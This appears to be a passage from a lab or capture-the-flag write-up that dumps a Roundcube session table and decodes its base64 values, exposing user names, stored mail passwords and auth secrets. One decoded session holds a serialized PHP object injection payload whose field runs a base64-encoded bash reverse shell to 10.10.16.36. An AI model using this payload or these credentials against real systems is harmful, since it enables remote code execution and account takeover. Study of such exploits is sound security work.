OjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
| m9bk3ael6h3uo5duhspr7rk5qe | 2025-08-14 06:49:28 | 172.17.0.1 | dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJXOGRtcUZXc3pQdEVpc1g0Mm4zN0hVdWMwWGxrYU5LOSI7                                                                                                                                                                                                                                                                                                                                                                                             |
| mrlorecknvfmqt41lcft363fe4 | 2025-08-14 06:49:27 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6ImJuSk8wcFdLcWZ6Z3plUVlVS3pLdWMxSTJzOWRyV1liIjtsb2dpbl90aW1lfGk6MTc1NTE1NDE2Nzt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9TUEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoidkNTTkRCbUs4SlZNSHlmb05sY2tXMFAyVEwiO3JlcXVlc3RfdG9rZW58czozMjoiRnRmUUtRc3dycHZpZ1F5aFRhaTdvM0tXZGVUU295bU0iOw==                                                                                                                                                                                                                                                                                                                 |
| p3prekpqp60utafevnk77turv8 | 2025-08-14 06:49:27 | 172.17.0.1 | dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJERW0wdkZHeUVaV1N2YjVPVGdVQVNPUWtnSGdtQlAyaCI7                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
7 rows in set (0.228 sec)

MariaDB [roundcube]> 
```

Found these values from hashes.com:

```
dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJHRjZTaHdtZHFoa1Z4NEkzY0dPd0VHYjlvejRac3k5eiI7:temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}request_token|s:32:"GF6ShwmdqhkVx4I3cGOwEGb9oz4Zsy9z";

bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Im53bTZqcDM4OGh2MlFsbXB3czdsQ2QwNHluNGZQMExQIjtsb2dpbl90aW1lfGk6MTc1NTE1NDE1NDt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9TUEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoiZFh5MkJKUXU3aHZPc1VCend0bVUzTUM2ZHciO3JlcXVlc3RfdG9rZW58czozMjoiWkpaWGZtRDdGYjBvTllKSkpZUmVXU3VJaGpNalhBUEwiO3BsdWdpbnN8YToxOntzOjIyOiJmaWxlc3lzdGVtX2F0dGFjaG1lbnRzIjthOjE6e3M6NDoiIXh4eCI7YToxOntzOjIwOiIzMTc1NTE1NDE1NDA4MDM2NDAwMCI7czo2NDoiL3Zhci93d3cvaHRtbC9yb3VuZGN1YmUvdGVtcC9SQ01URU1QYXR0bW50Njg5ZDg2ZWFjMzkwNDcwMTE3ODg5MiI7fX19eHh4fE47MTp7czo1OiJmaWxlcyI7YToxOntzOjIwOiIzMTc1NTE1NDE1NDA4MDM2NDAwMCI7YTo2OntzOjQ6InBhdGgiO3M6NjQ6Ii92YXIvd3d3L2h0bWwvcm91bmRjdWJlL3RlbXAvUkNNVEVNUGF0dG1udDY4OWQ4NmVhYzM5MDQ3MDExNzg4OTIiO3M6NDoic2l6ZSI7aTo1NjM7czo0OiJuYW1lIjtzOjI1NzoifE86MTY6IkNyeXB0X0dQR19FbmdpbmUiOjMwOntzOjI1OiIAQ3J5cHRfR1BHX0VuZ2luZQBfc3RyaWN0IjtiOjA7czoyNDoiAENyeXB0X0dQR19FbmdpbmUAX2RlYnVnIjtiOjA7czoyNToiAENyeXB0X0dQR19FbmdpbmUAX2JpbmFyeSI7czowOiIiO3M6MjQ6IgBDcnlwdF9HUEdfRW5naW5lAF9hZ2VudCI7czowOiIiO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF9ncGdjb25mIjtzOjE2MjoiZWNobyAiWTNWeWJDQXRXQ0JRVDFOVUlDMWtJQ0lrS0dKaGMyZ2dMV01nSjJKaGMyZ2dMV2tnUGlZZ0wyUmxkaTkwWTNBdk1UQXVNVEF1TVRZdU16WXZORFEwTkNBd1BpWXhKeWtpSUdoMGRIQTZMeTh4TUM0eE1DNHhOaTR6TmpvNE1EQXdMMk5oYkd4aVlXTnIifGJhc2U2NCAtZHxzaDsjIjtzOjI2OiIAQ3J5cHRfR1BHX0VuZ2luZQBfaG9tZWRpciI7czowOiIiO3M6MzI6IgBDcnlwdF9HUEdfRW5naW5lAF9wdWJsaWNLZXlyaW5nIjtzOjA6IiI7czozMzoiAENyeXB0X0dQR19FbmdpbmUAX3ByaXZhdGVLZXlyaW5nIjtzOjA6IiI7czoyNjoiAENyeXB0X0dQR19FbmdpbmUAX3RydXN0RGIiO3M6MDoiIjtzOjI0OiIAQ3J5cHRfR1BHX0VuZ2luZQBfcGlwZXMiO2E6MDp7fXM6Mjk6IgBDcnlwdF9HUEdfRW5naW5lAF9hZ2VudFBpcGVzIjthOjA6e31zOjI4OiIAQ3J5cHRfR1BHX0VuZ2luZQBfb3BlblBpcGVzIjthOjA6e31zOjI2OiIAQ3J5cHRfR1BHX0VuZ2luZQBfcHJvY2VzcyI7YjowO3M6MzE6IgBDcnlwdF9HUEdfRW5naW5lAF9hZ2VudFByb2Nlc3MiO047czoyODoiAENyeXB0X0dQR19FbmdpbmUAX2FnZW50SW5mbyI7TjtzOjI3OiIAQ3J5cHRfR1BHX0VuZ2luZQBfaXNEYXJ3aW4iO2I6MDtzOjMwOiIAQ3J5cHRfR1BHX0VuZ2luZQBfZGlnZXN0X2FsZ28iO047czozMDoiAENyeXB0X0dQR19FbmdpbmUAX2NpcGhlcl9hbGdvIjtOO3M6MzI6IgBDcnlwdF9HUEdfRW5naW5lAF9jb21wcmVzc19hbGdvIjtOO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF9vcHRpb25zIjthOjA6e31zOjMyOiIAQ3J5cHRfR1BHX0VuZ2luZQBfY29tbWFuZEJ1ZmZlciI7czowOiIiO3M6MzM6IgBDcnlwdF9HUEdfRW5naW5lAF9wcm9jZXNzSGFuZGxlciI7TjtzOjMzOiIAQ3J5cHRfR1BHX0VuZ2luZQBfc3RhdHVzSGFuZGxlcnMiO2E6MDp7fXM6MzI6IgBDcnlwdF9HUEdfRW5naW5lAF9lcnJvckhhbmRsZXJzIjthOjA6e31zOjI0OiIAQ3J5cHRfR1BHX0VuZ2luZQBfaW5wdXQiO047czoyNjoiAENyeXB0X0dQR19FbmdpbmUAX21lc3NhZ2UiO047czoyNToiAENyeXB0X0dQR19FbmdpbmUAX291dHB1dCI7czowOiIiO3M6Mjg6IgBDcnlwdF9HUEdfRW5naW5lAF9vcGVyYXRpb24iO047czoyODoiAENyeXB0X0dQR19FbmdpbmUAX2FyZ3VtZW50cyI7YTowOnt9czoyNjoiAENyeXB0X0dQR19FbmdpbmUAX3ZlcnNpb24iO3M6MDoiIjt9:language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:3;username|s:5:"tyler";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"nwm6jp388hv2Qlmpws7lCd04yn4fP0LP";login_time|i:1755154154;timezone|s:17:"America/Sao_Paulo";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"dXy2BJQu7hvOsUBzwtmU3MC6dw";request_token|s:32:"ZJZXfmD7Fb0oNYJJJYReWSuIhjMjXAPL";plugins|a:1:{s:22:"filesystem_attachments";a:1:{s:4:"!xxx";a:1:{s:20:"31755154154080364000";s:64:"/var/www/html/roundcube/temp/RCMTEMPattmnt689d86eac3904701178892";}}}xxx|N;1:{s:5:"files";a:1:{s:20:"31755154154080364000";a:6:{s:4:"path";s:64:"/var/www/html/roundcube/temp/RCMTEMPattmnt689d86eac3904701178892";s:4:"size";i:563;s:4:"name";s:257:"|O:16:"Crypt_GPG_Engine":30:{s:25:"Crypt_GPG_Engine_strict";b:0;s:24:"Crypt_GPG_Engine_debug";b:0;s:25:"Crypt_GPG_Engine_binary";s:0:"";s:24:"Crypt_GPG_Engine_agent";s:0:"";s:26:"Crypt_GPG_Engine_gpgconf";s:162:"echo "Y3VybCAtWCBQT1NUIC1kICIkKGJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzYvNDQ0NCAwPiYxJykiIGh0dHA6Ly8xMC4xMC4xNi4zNjo4MDAwL2NhbGxiYWNr"|base64 -d|sh;#";s:26:"Crypt_GPG_Engine_homedir";s:0:"";s:32:"Crypt_GPG_Engine_publicKeyring";s:0:"";s:33:"Crypt_GPG_Engine_privateKeyring";s:0:"";s:26:"Crypt_GPG_Engine_trustDb";s:0:"";s:24:"Crypt_GPG_Engine_pipes";a:0:{}s:29:"Crypt_GPG_Engine_agentPipes";a:0:{}s:28:"Crypt_GPG_Engine_openPipes";a:0:{}s:26:"Crypt_GPG_Engine_process";b:0;s:31:"Crypt_GPG_Engine_agentProcess";N;s:28:"Crypt_GPG_Engine_agentInfo";N;s:27:"Crypt_GPG_Engine_isDarwin";b:0;s:30:"Crypt_GPG_Engine_digest_algo";N;s:30:"Crypt_GPG_Engine_cipher_algo";N;s:32:"Crypt_GPG_Engine_compress_algo";N;s:26:"Crypt_GPG_Engine_options";a:0:{}s:32:"Crypt_GPG_Engine_commandBuffer";s:0:"";s:33:"Crypt_GPG_Engine_processHandler";N;s:33:"Crypt_GPG_Engine_statusHandlers";a:0:{}s:32:"Crypt_GPG_Engine_errorHandlers";a:0:{}s:24:"Crypt_GPG_Engine_input";N;s:26:"Crypt_GPG_Engine_message";N;s:25:"Crypt_GPG_Engine_output";s:0:"";s:28:"Crypt_GPG_Engine_operation";N;s:28:"Crypt_GPG_Engine_arguments";a:0:{}s:26:"Crypt_GPG_Engine_version";s:0:"";}

dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJFbU9iNDhiMHN6SGNEZ3c1MnNjcUlWRjdyNmNBZ0lDWSI7:temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}request_token|s:32:"EmOb48b0szHcDgw52scqIVF7r6cAgICY";

bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7:language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";

dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJXOGRtcUZXc3pQdEVpc1g0Mm4zN0hVdWMwWGxrYU5LOSI7:temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}request_token|s:32:"W8dmqFWszPtEisX42n37HUuc0XlkaNK9";

bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6ImJuSk8wcFdLcWZ6Z3plUVlVS3pLdWMxSTJzOWRyV1liIjtsb2dpbl90aW1lfGk6MTc1NTE1NDE2Nzt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9TUEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoidkNTTkRCbUs4SlZNSHlmb05sY2tXMFAyVEwiO3JlcXVlc3RfdG9rZW58czozMjoiRnRmUUtRc3dycHZpZ1F5aFRhaTdvM0tXZGVUU295bU0iOw==:language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:3;username|s:5:"tyler";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"bnJO0pWKqfzgzeQYUKzKuc1I2s9drWYb";login_time|i:1755154167;timezone|s:17:"America/Sao_Paulo";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"vCSNDBmK8JVMHyfoNlckW0P2TL";request_token|s:32:"FtfQKQswrpvigQyhTai7o3KWdeTSoymM";

